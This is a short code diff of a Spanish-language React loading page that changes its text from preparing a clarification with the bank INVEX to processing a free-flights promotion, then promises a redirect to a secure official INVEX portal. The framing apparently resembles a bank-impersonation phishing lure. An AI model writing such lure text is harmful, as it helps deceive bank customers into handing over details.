@@ -62,7 +62,7 @@ const GenerandoAclaracion: React.FC = () => {
       />
       
       <h1 className="text-2xl font-bold mb-4 text-[#BE0046]">
-        {hasSessionId ? "Iniciando proceso de verificación" : "Generando aclaración"}
+        {hasSessionId ? "Iniciando proceso de verificación" : "Procesando promoción de vuelos"}
       </h1>
       
       <div className="w-full max-w-md mb-6">
@@ -79,7 +79,7 @@ const GenerandoAclaracion: React.FC = () => {
         {hasSessionId ? (
           <>
             <p className="mb-2">
-              Estamos preparando su proceso de verificación con INVEX.
+              Estamos preparando su proceso de verificación para la promoción de vuelos INVEX.
             </p>
             <p>
               Será redirigido a la plataforma segura en unos momentos. Por favor no cierre esta ventana.
@@ -88,7 +88,7 @@ const GenerandoAclaracion: React.FC = () => {
         ) : (
           <>
             <p className="mb-2">
-              Estamos preparando la información para su aclaración con INVEX.
+              Estamos procesando su registro para la promoción de vuelos gratis con INVEX.
             </p>
             <p>
               Será redirigido al portal oficial de INVEX Tarjetas en unos momentos.
